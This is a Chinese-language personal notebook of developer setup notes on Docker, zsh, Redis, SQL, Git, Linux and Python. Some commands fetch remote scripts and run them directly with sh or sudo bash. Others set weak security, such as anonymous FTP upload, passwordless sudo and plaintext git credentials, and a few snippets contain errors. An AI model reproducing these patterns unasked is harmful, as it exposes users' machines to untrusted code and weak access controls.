**Docker不使用sudo**

将用户添加到 docker 用户组

```shell
sudo usermod -aG docker $USER  # 先试这个

cat /etc/group | grep docker # 查找 docker 组，确认其是否存在
groups # 列出自己的用户组，确认自己在不在 docker 组中

# 如果 docker 组不存在，则添加之：
sudo groupadd docker

# 将当前用户添加到 docker 组
sudo gpasswd -a ${USER} docker

# 重启服务
sudo service docker restart

# 切换一下用户组（刷新缓存）
newgrp - docker;
newgrp - `groups ${USER} | cut -d' ' -f1`; # TODO：必须逐行执行，不知道为什么，批量执行时第二条不会生效
# 或者，注销并重新登录
pkill X
```

[sqli-labs Docker](https://www.jianshu.com/p/2ad3edf3c61f)



## zsh

### 基本安装


```shell
echo $SHELL			  		查看当前shell环境
cat /etc/shells		  		查看系统已有哪些shell
sudo apt install zsh -y		安装zsh
chsh -s $(which zsh)  		将默认shell改为zsh
wget https://github.com/robbyrussell/oh-my-zsh/raw/master/tools/install.sh -O - | sh			        安装oh-my-zsh
~/.oh-my-zsh/themes		已有主题目录（最爱：agnoster)
~/.oh-my-zsh/pluglins   已有插件目录，如果自己下载的话，clone到这个目录
source ~/.zshrc			刷新配置文件

常用插件：
z, rails, git, colored-man-pages
zsh-syntax-highlighting
git clone https://github.com/zsh-users/zsh-syntax-highlighting  注意clone到plugins目录
zsh-autosuggestions
git clone https://github.com/zsh-users/zsh-autosuggestions

小技巧：
用 /  代替 cd /
用 .. 代替 cd ..
用 …. 代替 cd ../..
用 ~  代替 cd ~
take fold_name: 建立fold_name的文件夹并且切换进去
x: 使用 x 代替 tar bz2 gz zip 等等一系列的命令
```

### Powerline fonts

```shell
git clone https://github.com/powerline/fonts.git
cd fonts
./install.sh

或者直接 sudo apt-get install fonts-powerline
然后重启终端，其他的啥也不用干
```



## SSR

```shell
wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubi/doubi/master/ssr.sh
sudo chmod +x ssr.sh
sudo bash ssr.sh
```

```shell
iOS 端可以从pp助手安装 Shadowrocket（pp正版）
最重要的一点，配置时类型要选择 ShadowsocksR
```



![avatar](https://sobaigu.com/images/srocketapp4.png)





## Redis

一个高性能 key-value 形式的 NOSQL 数据库。

```shell
# 数据类型
string  字符串
set k1 "2333"

hash  key=>value 集合
hmset myhash f1 "v1" f2 "v2"
hget myhash f1

list 列表
lpush mylist 555
lpush mylist 666
lrange mylist 0 10

set  无序集合
sadd key member

zset  有序集合
zadd key score member
```



## Message Queue

### 在项目中的应用场景及优缺点

+ 为什么要用？解决了什么问题？带来了什么新问题？

### 不同中间件的有哪些区别

+ kafka
+ activemq
+ rebbitmq
+ rocketmq

### 如何保证消息队列的高可用

### 如何保证消息不被重复消费

### 如何保证消费时的幂等性

### 如何保证消息的可靠性传输

### 如何保保证消息的顺序性

### 如何解决消息队列的延时以及过期失效问题

### 消息队列满了以后该怎么处理

### 对消息队列进行架构设计

## Markdown

### 链接

[这就是谷歌的链接](www.google.com)

### 表格

基本形式

First Header | Second Header | Third Header
------------ | ------------- | ------------
Content Cell | Content Cell  | Content Cell
Content Cell | Content Cell  | Content Cell

左、右对齐，居中

First Header | Second Header | Third Header
:----------- | :-----------: | -----------:
Left         | Center        | Right
Left         | Center        | Right

### 流程图

```flow
st=>start: Start
e=>end: End
接收用户名和密码=>operation: 接收用户名和密码
使用用户名查询数据库=>operation: 使用用户名查询数据库
数据库中是否有数据=>condition: 数据库中是否有数据?
走登录逻辑=>operation: 走登录逻辑
走注册逻辑=>operation: 走注册逻辑
密码是否正确=>condition: 密码是否正确?
把用户名和密码写入数据库=>inputoutput: 把用户名和密码写入数据库 
st->接收用户名和密码->使用用户名查询数据库->数据库中是否有数据
数据库中是否有数据(yes)->走登录逻辑->密码是否正确
数据库中是否有数据(no)->走注册逻辑->把用户名和密码写入数据库->e
密码是否正确(yes)->e
密码是否正确(no,down)->接收用户名和密码
```

### 时序图

```sequence
Title: Here is a title
A->B: Normal line
B-->C: Dashed line
C->>D: Open arrow
D-->>A: Dashed open arrow
```

### 甘特图

待补充

### 标记 ``

这就是`标记`

### 插图
#### 基本格式：

```shell
![Alt text](图片链接 "optional title")

Alt text：图片的Alt标签，用来描述图片的关键词，可不写。
最初的本意是当图片因为某种原因不能被显示时而出现的替代文字，后来又被用于SEO，
可以方便搜索引擎根据Alt text里面的关键词搜索到图片。 
图片链接：可以是图片的本地地址或网址。"optional title"：鼠标悬置于图片上会出现的标题文字，可不写。
```



#### 插入本地图片

```shell
![avatar](/home/picture/1.png)
支持绝对路径和相对路径
```

- 缺点：不灵活不好分享，本地图片的路径更改或丢失都会造成markdown文件调不出图



#### **Markdown** 插入在线图片

```shell
![avatar](地址)
```

+ 缺点：将图片存在网络服务器上，非常依赖网络



#### 把图片存入文件 **Markdown**

```shell
![avatar][base64str]
[base64str]:data:image/png;base64,iVBORw0......


base64的图片编码如何得来？

1.用python将图片转化为base64字符串:
import base64
f = open('723.png','rb') 			# 二进制方式打开图文件
ls_f = base64.b64encode(f.read())   # 读取文件内容，转换为base64编码
f.close()
print(ls_f)

2.base64字符串转化为图片
import base64
bs = 'iVBORw0KGgoAAAANSUhEUg....'     # 太长了省略
imgdata = base64.b64decode(bs)
file = open('2.jpg','wb')
file.write(imgdata)
file.close()
```



## SQL

**基本概念：**

+ SQL 语句：Structured Query Language. DBMS 用来和数据库打交道的标准语言。不区分大小写。

+ Database：

    按照数据结构来组织、存储和管理数据的仓库。解决的问题：持久化存储，优化读写，保证数据的有效性。

    三种模型：

    + 层次模型。看起来就像一棵树。
    + 网状模型。看其他就像一张图。
    + 关系模型。看起来就像一张Excel。关系型数据库是建立在关系模型基础上的数据库，借助集合代数等数学概念和方法来处理数据库中的数据。

    分类：文档型（SQLite），轻巧，省电，效率低；服务型（MySQL），性能强；

    数据库设计：

    + 三范式：列不可拆分，唯一标识，引用主键
    + 关系及存储：1对1,1对多，多对多

+ 每一行称为`记录`（Record），记录的是一个逻辑意义上的数据。

+ 每一列称为`字段`（Column），同一个表的每一行记录都拥有相同的若干字段。

    字段定义了数据类型，以及是否允许为 NULL，注意 NULL 表示字段数据不存在，并非为 0。

    不允许为NULL可以简化查询条件，加快查询速度，也利于应用程序读取数据后无需判断是否为NULL。

+ 关系表中任意两条记录不能重复，不能重复不是指两条记录不完全相同，而是指能够通过某个字段唯一确定一条记录，这个字段被称为`主键`。

    主键选取原则：不使用任何业务相关的字段作为主键。

    一般把主键字段命名为`id，`常见`id`字段类型有自增整数类型、全局唯一 GUID 类型。

    记录一旦插入表中，主键最好不要修改，否则会造成一系列的影响。

+ 关系数据库允许通过多个字段唯一标识记录，即两个或更多字段都设置为主键，这种主键被称为`联合主键`。

    作为联合主键的字段中，只要不出现全部相同字段就行。

+ 外键：

    外键并不是通过列名实现的，而是通过定义外键约束实现的：

    ```
    ALTER TABLE students
    ADD CONSTRAINT fk_class_id
    FOREIGN KEY (class_id)
    REFERENCES classes (id);
    ```

    删除一个外键约束

    ```
    ALTER TABLE students
    DROP CONSTRAINT fk_class_id;
    ```

    注意：删除外键约束并没有删除外键这一列。删除列是通过`DROP COLUMN ...`实现的。

+ 索引

+ Mysql：关系型数据库管理系统（DBMS）之一，开源。默认端口：3306

#### 查询数据

+ 基本查询：

  ```sql
  SELECT * FROM <表名>;  -- 查询表的所有数据，* 表示所有列
  SELECT 100+200;  -- 直接返回计算结果，可以执行 SELECT 1; 来测试数据库连接
  ```

+ 条件查询

  ```sql
  SELECT * FROM <表名> WHERE score >= 80;  -- where 后接条件语句
  -- 使用 AND OR NOT，即与、或、非，优先级：NOT > AND > OR
     =    >     >=      <     <=     <>
  -- 等于 大于 大于或等于 小于 小于或等于 不等
  LIKE 
  -- name LIKE 'ab%'	name LIKE '%bc%' %表示任意字符，例如'ab%'将匹配'ab'，'abc'，'abcd'
  ```

+ 投影查询：查询指定列

  ```sql
  SELECT id, score, name FROM students;
  -- 还可以给列起别名
  SELECT 列1 别名1, 列2 别名2, 列3 别名3 FROM ...
  ```

+ 排序

  ```sql
  SELECT gender, score FROM students ORDER BY score;  -- 按score从低到高（ASC被省略）
  SELECT name, gender, score FROM students ORDER BY score DESC;  -- 高到低
  ORDER BY score DESC, gender;  -- score相同再按gender排序
  ```

+ 分页查询

  ```sql
  SELECT id, name, gender, score
  FROM students
  ORDER BY score DESC
  LIMIT 3 OFFSET 0;  -- 每页三条记录，最多取三条，OFFSET 为 3 则跳过前三条
  --OFFSET超过了查询的最大数量并不会报错，而是得到一个空的结果集
  
  SELECT * FROM users limit 0, 10  -- 1,10
  ```

+ 聚合查询

  ```sql
  SELECT COUNT(*) FROM students;  -- 查询所有列的行数
  SELECT COUNT(*) boys FROM students WHERE gender = 'M';  -- 搭配条件语句，别名为 boys
              SUM                      AVG                 MAX       MIN
  --某列的和，该列必须为数值类型 某列的平均值，该列必须为数值类型 某列的最大值 某列的最小值
  SELECT COUNT(*) num FROM students GROUP BY class_id;  -- 按 class_id 分组，返回三行数据
  SELECT class_id, COUNT(*) num FROM students GROUP BY class_id;  -- 增加 class_id 列
  SELECT class_id, gender, COUNT(*) num FROM students 
  GROUP BY class_id, gender;  -- 按 class_id, gender 分组
  ```

  如果聚合查询的`WHERE`条件没有匹配到任何行，`COUNT()`会返回0，而`MAX()`、`MIN()`、`MAX()`和`MIN()`会返回`NULL`

+ 多表查询

  ```sql
  SELECT * FROM FROM <表1> <表2>;  -- 返回两表的笛卡尔积表
  SELECT
      students.id sid,
      students.name,
      students.gender,
      students.score,
      classes.id cid,
      classes.name cname
  FROM students, classes;
  -- 增加条件
  SELECT
      s.id sid,
      s.name,
      s.gender,
      s.score,
      c.id cid,
      c.name cname
  FROM students s, classes c
  WHERE s.gender = 'M' AND c.id = 1;
  ```

+ 连接查询

  连接查询是另一种类型的多表查询。连接查询对多个表进行JOIN运算，简单地说，就是先确定一个主表作为结果集，然后，把其他表的行有选择性地“连接”在主表结果集上。

#### 修改数据

+ INSERT

  ```sql
  INSERT INTO <表名> (字段1, 字段2, ...) VALUES (值1, 值2, ...);
  INSERT INTO students (class_id, name, gender, score) VALUES (2, '大牛', 'M', 80);
  --字段顺序不必和数据库表的字段顺序一致，但值的顺序必须和字段顺序一致
  --如果一个字段有默认值，那么在INSERT语句中也可以不出现
  ```

+ UPDATE

  ```sql
  UPDATE <表名> SET 字段1=值1, 字段2=值2, ... WHERE ...;
  UPDATE students SET name='大牛', score=66 WHERE id=1;
  UPDATE students SET name='小牛', score=77 WHERE id>=5 AND id<=7;
  UPDATE students SET score=score+10 WHERE score<80;
  UPDATE students SET score=100 WHERE id=999;
  --要特别小心的是，UPDATE语句可以没有WHERE条件
  UPDATE students SET score=60;
  --这时，整个表的所有记录都会被更新。所以，在执行UPDATE语句时要非常小心，最好先用SELECT语句来测试WHERE条件是否筛选出了期望的记录集，然后再用UPDATE更新
  ```

+ DELETE

  ```sql
  DELETE FROM <表名> WHERE ...;
  DELETE FROM students WHERE id=1;
  DELETE FROM students WHERE id>=5 AND id<=7;
  --和UPDATE类似，不带WHERE条件的DELETE语句会删除整个表的数据
  ```

#### 事务

在执行SQL语句的时候，某些业务要求，一系列操作必须全部执行，而不能仅执行一部分。例如，一个转账操作：

```sql
-- 从id=1的账户给id=2的账户转账100元
-- 第一步：将id=1的A账户余额减去100
UPDATE accounts SET balance = balance - 100 WHERE id = 1;
-- 第二步：将id=2的B账户余额加上100
UPDATE accounts SET balance = balance + 100 WHERE id = 2;
```

这两条SQL语句必须全部执行，或者，由于某些原因，如果第一条语句成功，第二条语句失败，就必须全部撤销。

这种把多条语句作为一个整体进行操作的功能，被称为数据库*事务*。数据库事务可以确保该事务范围内的所有操作都可以全部成功或者全部失败。如果事务失败，那么效果就和没有执行这些SQL一样，不会对数据库数据有任何改动。

**RDBMS的特点：**

- 数据以表格的形式出现
- 每行为各种记录名称
- 每列为记录名称所对应的数据域
- 许多的行和列组成一张表单
- 若干的表单组成database

## Database design

[继续学习](<https://blog.csdn.net/sinat_35988648/article/details/74279681>)

#### 设计步骤

+ 需求分析
+ 逻辑设计
+ 物理设计
+ 维护优化

## MySQL

**常用命令**

```shell
# 登录
mysql -user root -password xxxx
mysql -u root -p xxxx
mysql -uroot -pxxxx

ps -ef | grep mysqld			# 检查是否启动

CREATE DATABASE test;			# 创建数据库
DROP DATABASE test;				# 删除数据库
USE database_name;				# 选择要操作的数据库，以后所有Mysql命令都只针对该数据库
SHOW DATABASES;					# 列出 MySQL 数据库管理系统的数据库列表
SHOW TABLES;					# 显示制定数据库的所有表
CREATE TABLE students;			# 创建表
DROP TABLE students;			# 删除表
TRUNCATE table students;		# 清空表
DESC students;					# 查看表结构
SHOW CREATE TABLE students;		# 查看创建表的 SQL 语句
SHOW COLUMNS FROM table_name	# 显示数据表的属性
SHOW INDEX FROM table_name  	# 显示数据表的详细索引信息，包括主键
# 输出Mysql数据库管理系统的性能及统计信息
SHOW TABLE STATUS LIKE [FROM db_name] [LIKE 'pattern'] \G: 
SHOW TABLE STATUS  FROM RUNOOB;  					# 显示数据库 RUNOOB 中所有表的信息
SHOW TABLE STATUS from RUNOOB LIKE 'runoob%';       # 表名以runoob开头的表的信息
SHOW TABLE STATUS from RUNOOB LIKE 'runoob%'\G;     # 加上 \G，查询结果按列打印

# 导入数据
1
mysql>use abc;
mysql>set names utf8;
mysql>source /home/abc/abc.sql;
2
mysql -u用户名 -p密码 数据库名 < 数据库名.sql
```

## MongoDB

[参考](https://juejin.im/post/5add9e655188256735642122)

**基本概念**  

-   `数据库` MongoDB的单个实例可以容纳多个独立的数据库，比如一个学生管理系统就可以对应一个数据库实例。
-   `集合` 数据库是由集合组成的，一个集合用来表示一个实体，如学生集合。
-   `文档` 集合是由文档组成的，一个文档表示一条记录，比如一位同学张三就是一个文档

**常用命令**

```shell
# 服务端启动
mkdir data  # 新建目录
mongod --dbpath='./data'  # 指定数据库路径
(waiting for connections on port 27017就表示启动成功)
--port  			指定服务端口号，默认端口27017
--logpath  			指定MongoDB日志文件，注意是指定文件不是目录
--logappend  		使用追加的方式写日志
--dbpath  			指定数据库路径
--directoryperdb  	设置每个数据库将被保存在一个单独的目录


# 客户端启动
mongo (--host 127.0.0.1)


# 数据库操作
show dbs			# 显示所有数据库
use school  	 	# 选择数据库school
db / db.getName()	# 查看当前使用的数据库
db.dropDatabase()	# 删除数据库


# 集合操作
db.school.help()	# 查看帮助文档
show collections	# 查看数据库下的集合
db.createCollection(collection_Name)	# 创建一个集合
db.collection_Name.insert(document)		# 创建集合并插入文档

# 文档操作
db.collection_name.insert(document)  	# insert
db.collection_name.save(document)		# save

# 以后再看上面那个链接
```




## Git

### Git 提示fatal: remote origin already exists

```shell
git remote rm orign
git remote add origin https://github.com/wywwzjj/Note.git
# 如果还不行，手动修改gitconfig
vi .git/config
# 把 [remote “origin”] 那一行删掉就好了
```



### Create new repo

```shell
echo "# Note" >> README.md
git init
git add README.md
git commit -m "first commit"
git remote add origin https://github.com/wywwzjj/Note.git
git push -u origin master
```

### Push an existing repository

```shell
git remote add origin https://github.com/wywwzjj/Flask-Movies.git
git push -u origin master
```

实战：

```shell
git remote add origin https://github.com/yourgithubID/gitRepo.git #建立远程仓库
git checkout -b first-step
git add .
git status
git commit -m " "
git checkout master
git merge first-step
git push
cap production deploy
```



### 常用的GitHub代码

```shell
git pull origin master    		# 从云端获得最新版本
git clone  						# 本地如果无远程代码，先做这步，不然就忽略
git status  					# 查看本地自己修改了多少文件
git add . 						# 添加远程不存在的git文件
git add -A  					# 把项目中的所有文件都放到仓库
git commit -m "commit-info"		# 提交修改
git push origin master 			# 更新到远程服务器上
git rm  						# 移除文件
git log  						# 查看提交历史
```



### 删除操作

```shell
git pull origin master                  # 将远程仓库里面的项目拉下来
dir                                     # 查看有哪些文件夹
git rm -r --cached target               # 删除target文件夹
git commit -m '删除了target'             # 提交,添加操作说明
git push -u origin master               # 将本次更改更新到github项目上去
```



### 误删撤回（未提交时）

```shell
git checkout -f  // 强制撤销
```



### 配置

首先在本地创建ssh key；

```shell
ssh-keygen -t rsa -C "your_email@youremail.com"
# 然后一路回车
cat ~/.ssh/id_rsa.pub  # 复制里面的key
```

进入 GitHub 上的 Account Settings（账户配置），左边选择SSH and GPG keys，粘贴 key。

```shell
ssh -T git@github.com  # 验证是否成功
```

如果是第一次的会提示是否continue，输入yes就会看到：You've successfully authenticated, but GitHub does not provide shell access 。这就表示已成功连上github。



接下来我们要做的就是把本地仓库传到github上去，在此之前还需要设置username和email，因为github每次commit都会记录他们。

```shell
git config --global user.name "your name"
git config --global user.email "your_email@youremail.com"
git config --global credential.helper store 	# 避免 git push 时重复输密码
```

进入要上传的仓库，右键git bash，添加远程地址：

```shell
git remote add origin git@github.com:yourName/yourRepo.git
```

后面的yourName和yourRepo表示你再github的用户名和刚才新建的仓库，加完之后进入.git，打开config，这里会多出一个remote "origin"内容，这就是刚才添加的远程地址，也可以直接修改config来配置远程地址。

创建新文件夹，打开，然后执行 git init 以创建新的 git 仓库。



### 检出仓库

执行如下命令以创建一个本地仓库的克隆版本：

```shell
git clone /path/to/repository 
```

如果是远端服务器上的仓库，你的命令会是这个样子：

```shell
git clone username@host:/path/to/repository
```



### 工作流

你的本地仓库由 git 维护的三棵"树"组成。第一个是你的 工作目录，它持有实际文件；第二个是 暂存区（Index），它像个缓存区域，临时保存你的改动；最后是 HEAD，它指向你最后一次提交的结果。

你可以提出更改（把它们添加到暂存区），使用如下命令：

```shell
git add <filename>
git add *
```

这是 git 基本工作流程的第一步；使用如下命令以实际提交改动：

```shell
git commit -m "代码提交信息"
```

现在，你的改动已经提交到了 HEAD，但是还没到你的远端仓库。 推送改动 你的改动现在已经在本地仓库的 HEAD 中了。执行如下命令以将这些改动提交到远端仓库：

```shell
git push origin master
```

可以把 master 换成你想要推送的任何分支。
如果你还没有克隆现有仓库，并欲将你的仓库连接到某个远程服务器，你可以使用如下命令添加：

```shell
git remote add origin <server>
```

如此你就能够将你的改动推送到所添加的服务器上去了。



### 分支

分支是用来将特性开发绝缘开来的。在你创建仓库的时候，master 是"默认的"分支。在其他分支上进行开发，完成后再将它们合并到主分支上。
创建一个叫做"feature_x"的分支，并切换过去：

```shell
git checkout -b feature_x
```

切换回主分支：

```shell
git checkout master
```

合并到主分支:

```shell
git merge feature_x
```

再把新建的分支删掉：

```shell
git branch -d feature_x
```

除非你将分支推送到远端仓库，不然该分支就是 不为他人所见的：

```shell
git push origin <branch>
```

更新与合并 要更新你的本地仓库至最新改动，执行：

```shell
git pull
```

以在你的工作目录中 获取（fetch） 并 合并（merge） 远端的改动。 要合并其他分支到你的当前分支（例如 master），执行：

```shell
git merge <branch>
```

在这两种情况下，git 都会尝试去自动合并改动。遗憾的是，这可能并非每次都成功，并可能出现冲突（conflicts）。 这时候就
需要你修改这些文件来手动合并这些冲突（conflicts）。改完之后，你需要执行如下命令以将它们标记为合并成功：

```shell
git add <filename>
```

在合并改动之前，你可以使用如下命令预览差异：

```shell
git diff <source_branch> <target_branch>
```



### 标签

为软件发布创建标签是推荐的。这个概念早已存在，在 SVN 中也有。你可以执行如下命令创建一个叫做 1.0.0 的标签：

```shell
git tag 1.0.0 1b2e1d63ff
```

1b2e1d63ff 是你想要标记的提交 ID 的前 10 位字符。可以使用下列命令获取提交 ID：

```shell
git log
```

你也可以使用少一点的提交 ID 前几位，只要它的指向具有唯一性。

替换本地改动 假如你操作失误（当然，这最好永远不要发生），你可以使用如下命令替换掉本地改动：

```shell
git checkout -- <filename>
```

此命令会使用 HEAD 中的最新内容替换掉你的工作目录中的文件。已添加到暂存区的改动以及新文件都不会受到影响。

假如你想丢弃你在本地的所有改动与提交，可以到服务器上获取最新的版本历史，并将你本地主分支指向它：

```shell
git fetch origin
git reset --hard origin/master
```

实用小贴士 内建的图形化 git：

```shell
gitk
```

彩色的 git 输出：

```shell
git config color.ui true
```

显示历史记录时，每个提交的信息只显示一行：

```shell
git config format.pretty oneline
```

交互式添加文件到暂存区：

```shell
git add -i
```



## Linux


### 常用命令

+   ssh

```shell
ssh-keygen  # 默认在当前用户目录下创建.ssh文件夹：公钥 id_rsa.pub 私钥 id_rsa
ssh -i Key user@host  # 用私钥登陆，Key需要改权限 600
ssh user@host
```

​	与 scp 共同的参数
```shell
`-P`:数据传输默认端口，默认是22
`-r`:递归拷贝整个目录
`-i`:指定密钥文件，参数直接传递给ssh使用
`-l`:限定网速，以Kbit/s为单位
`-C`:允许压缩
`-1,-2`:强制scp命令使用ssh1或者ssh2协议
`-4,-6`:使用ipv4或者ipv6寻址
```


+ scp			

    基于 ssh 登录进行安全的远程文件拷贝命令

```shell
scp config/master.key treenewbee@45.79.84.153:/home/config  # 发送给远程机

# 本地发给远程
scp file user@host:folder      		# 单个文件
scp -r folder user@host:folder		# 整个目录  `-r`:递归拷贝整个目录

# 远程复制到本地
scp -r -i privateKey root@IP:remote_folder local_folder
`-i`:指定密钥文件，参数直接传递给ssh使用
```


+   apt

```shell
dpkg --list  	# 已装软件
sudo apt-get remove <programname>			# 只卸载软件，保留配置文件和数据
sudo apt-get purge / apt-get --purge remove # 完全卸载干净
```

+   tar

```shell
tar xvf filename  # 解压
tar cvf filename  # 打包
```

+ sftp

```shell
SFTP,即 SSH 文件传输协议，利用安全的连接传输文件，还可遍历本地和远程系上的文件系统
ssh username@remote_hostname_or_IP
# 成功后提示符将变为 > 

help / ?  # 打开帮助
Available commands:
bye                                Quit sftp
cd path                            Change remote directory to 'path'
chgrp grp path                     Change group of file 'path' to 'grp'
chmod mode path                    Change permissions of file 'path' to 'mode'
chown own path                     Change owner of file 'path' to 'own'
df [-hi] [path]                    Display statistics for current directory or
                                   filesystem containing 'path'
exit                               Quit sftp
get [-Ppr] remote [local]          Download file
help                               Display this help text
lcd path                           Change local directory to 'path'

# 在命令前加一个 'l'，即在本地操作
lls / lpwd / lcd
get remote_file_name  # 远程下载
get remote_file_name local_name_file
get -r directory_name  # 递归下载文件夹
put local_file_name  # 上传
put -r directory_name  
```

### 环境配置

+ 搭建 FTP 服务器 [参考](https://blog.csdn.net/soslinken/article/details/79304076)

    ```shell
    sudo apt-get install vsftpd
    sudo vim /etc/vsftpd.config
    anonymous_enable=YES    #设置匿名可登录
    local_enable=YES        #本地用户允许登录
    write_enable=YES        #用户是否有写的权限
    anon_upload_enable=YES   #允许匿名用户上传
    anon_mkdir_write_enable=YES   #允许匿名用户创建目录文件
    
    创建登录用户
    #先创建ftp目录
    $ sudo mkdir /home/ftpdir
    #添加用户
    $ sudo useradd -d /home/ftpdir -s /bin/bash ftpuser
    #设置用户密码
    $ sudo passwd ftpuser
    #设置ftp目录用户权限
    $ sudo chown ftpuser:ftpuser /home/ftpdir
    
    添加vsftpd 登录用户 ftpuser，直接 > 重定向就好
    #新建文件/etc/vsftpd.user_list，用于存放允许访问ftp的用户：
    $ sudo vim /etc/vsftpd.user_list
    
    添加vsftpd登录用户对目录树的权限
    sudo vim /etc/vsftpd.chroot_list
    
    # 重启
    $ sudo service vsftpd restart
    ```

+ kali 无法复制粘贴

    ```shell
    #中科大
    deb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
    deb-src http://mirrors.ustc.edu.cn/kali kali-rolling main non-free contrib
     
    #阿里云
    deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
    deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
     
    #清华大学
    deb http://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    deb-src https://mirrors.tuna.tsinghua.edu.cn/kali kali-rolling main contrib non-free
    
    # 更换源之后，装一个软件即可
    apt install open-vm-tools-desktop fuse
    ```

    

+ Ubuntu 卸载不常用软件

    ```shell
    apt purge libreoffice-common -y
    apt purge unity-webapps-common -y 
    apt purge thunderbird totem rhythmbox empathy brasero simple-scan gnome-mahjongg aisleriot gnome-mines cheese gnome-sudoku transmission-common gnome-orca webbrowser-app landscape-client-ui-install -y
    apt purge deja-dup -y
    ```

    

+ centos 初始配

    ==网络部分==

    新安装Centos 7，执行`dhclient`,系统会从dhcp服务器获取到IP地址。

    执行`ip add`命令查看网卡信息，**完整命令为ip address**。

    重启DHCP服务的命令为`dhclient -r`

    1、打开配置文件

    ```shell
    vi /etc/sysconfig/network-script/ifcfg-eth0
    ```

    2、修改配置文件

    （1）动态获取IP配置（可选1）：

    ```shell
    ONBOOT=yes
    MM_Controlled=no
    BOOTPROTO=dhcp
    ```

    （2）设置固定IP配置（可选2）：

    ```shell
    ONBOOT=yes
    MM_Controlled=no
    BOOTPROTO=static
    IPADDR=192.168.1.33
    BROADCAST=192.168.1.255
    NETMASK=255.255.255.0
    GATEWAY=192.168.1.1
    DNS1=192.168.1.1
    DNS2=192.168.1.2
    ```

    3、重启网卡

    ```
    systemctl restart networking
    ```

    附（网络配置文件eth0配置项说明）：

    ```shell
    TYPE=Ethernet       #网卡类型
    DEVICE=eth0         #网卡接口名称
    ONBOOT=yes          #系统启动时是否自动加载
    BOOTPROTO=static    #启用地址协议 --static:静态协议 --bootp协议 --dhcp协议
    IPADDR=192.168.1.11      #网卡IP地址
    NETMASK=255.255.255.0    #网卡网络地址
    GATEWAY=192.168.1.1      #网卡网关地址
    DNS1=10.203.104.41       #网卡DNS地址
    HWADDR=00:0C:29:13:5D:74 #网卡设备MAC地址
    BROADCAST=192.168.1.255  #网卡广播地址
    ```

    ==vmtools==

    [教程链接](https://www.linuxidc.com/Linux/2017-05/143323.htm)

    ```shell
    # 卸载
    usr/bin/vmware-uninstall-tools.pl
    rm -rvf /usr/lib/vmware-tools
    ```

+ visudo

    ```shell
    # 不输密码
    user_name ALL=(ALL) NOPASSWD: ALL
    # group
    user_name ALL=(ALL) NOPASSWD: ALL
    %admin ALL=(ALL) NOPASSWD: ALL
    ```


+ py3

  ```shell
  # Anaconda
  安装时选择添加到环境变量
  # 修改包管理镜像为国内源
  conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
  conda config --set show_channel_urls yes
  conda upgrade --all  # 更新所有库
  conda install numpy scipy pandas  # 安装库
  # 配置 pycharm 时选择 System py 解释器
  
  # 直接装Python
  sudo apt-get install -y python3-dev build-essential libssl-dev libffi-dev libxml2 libxml2-dev libxslt1-dev zlib1g-dev libcurl4-openssl-dev
  sudo apt-get install -y python3
  
  sudo apt-get install -y python3-pip
  ```

+   Chrome

    ```shell
    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
    sudo dpkg -i google-chrome-stable_current_amd64.deb; sudo apt-get -fy install
    ```

+   ChromeDriver

    ```shell
    # 一定要看文档选择合适的版本呀......不然怀疑人生
    # https://sites.google.com/a/chromium.org/chromedriver/downloads
    sudo apt-get install unzip
    
    wget -N http://chromedriver.storage.googleapis.com/2.26/chromedriver_linux64.zip
    unzip chromedriver_linux64.zip
    chmod +x chromedriver
    
    sudo mv -f chromedriver /usr/local/share/chromedriver
    sudo ln -s /usr/local/share/chromedriver /usr/local/bin/chromedriver
    sudo ln -s /usr/local/share/chromedriver /usr/bin/chromedriver
    ```

+   MongoDB [详细](https://www.digitalocean.com/community/tutorials/how-to-install-mongodb-on-ubuntu-18-04)

    ```shell
    # Installing MongoDB
    sudo apt update
    sudo apt install -y mongodb
    
    # Checking the Service and Database
    sudo systemctl status mongodb
    ● mongodb.service - An object/document-oriented database
       Loaded: loaded (/lib/systemd/system/mongodb.service; enabled; vendor preset: enabled)
       Active: active (running) since Sat 2018-05-26 07:48:04 UTC; 2min 17s ago
         Docs: man:mongod(1)
     Main PID: 2312 (mongod)
        Tasks: 23 (limit: 1153)
       CGroup: /system.slice/mongodb.service
               └─2312 /usr/bin/mongod --unixSocketPrefix=/run/mongodb --config /etc/mongodb.conf
    
    mongo --eval 'db.runCommand({ connectionStatus: 1 })'  # version, address and port
    
    # Managing the MongoDB Service
    sudo systemctl status/stop/start/restart mongodb
    sudo systemctl disable/enable mongodb  # automatic startup
    ```

### 命令行

终端下光标移动

```
CTRL + a / e		跳至行首/尾

CTRL + b / f 		前后移动一个字符位置

CTRL + u / k		删掉光标前/后的所有字符

CTRL + h / d		往前/后删一个字符

CTRL + x + e 		进入编辑器编辑当前命令

CTRL + p / n 		切换历史命令

CTRL + y			粘贴最后一次被删除的语句

CTRL + r 			搜索历史命令

CTRL + w			往前删一个单词
Alt	+ d				往后删一个单词

Alt + b / f			前后移动一个单词位置
```

### VIM



## Python

### 易错

```python
# 高维数组声明，不能直接 [[]] * 5
>>> lists = [[]] * 3
>>> lists
[[], [], []]
>>> lists[0].append(3)
>>> lists
[[3], [3], [3]]

>>> lists = [[] for i in range(3)]
>>> lists[0].append(3)
>>> lists[1].append(5)
>>> lists[2].append(7)
>>> lists
[[3], [5], [7]]
```



functions decision control， 

loops and booleans，

simulation and design，

classes， 

data collection，

object-oriented design  algorithms

**单词**

- mutable  易变的
- invoke  v.  唤起，调用
- shuffle  n. v.  搅乱，洗牌

list

- list1 = [1, 3]
    list2 = list1
    list1[0] = 4

    list2 = [4, 3]  相当于引用？

- def f(i, values = []):
  ​    ​    values.append(i)
  ​    ​    return values

  f(1)
  f(2)
  v = f(3)
  print(v)  

  **v = [1, 2, 3]**

- random.shuffle(list1)  打乱顺序
- list1 = [11, 2, 23] and list2 = [2, 11, 23], list1  !=  list2
- insert(index, data)  index 从0开始
- pop()  删除末尾元素 pop(index) 删除索引为 index 元素
- remove() 删除指定元素
- append() 在末尾追加元素
- count() 输出元素出现次数
- sort() 默认从小到大排序
- reverse() 反转
- extend() 在列表末尾一次性追加另一个序列中的多个值
- If a key is not in the list, the binarySearch function returns **-(insertion point + 1)**

tuple

- 一旦初始化就不能改变，string 也是？
- 上面的初始化后不能改变也是有条件的， Python tuple is immutable if every element in the tuple is immutable. 比如 tuple 中有个 list，也是可以变得
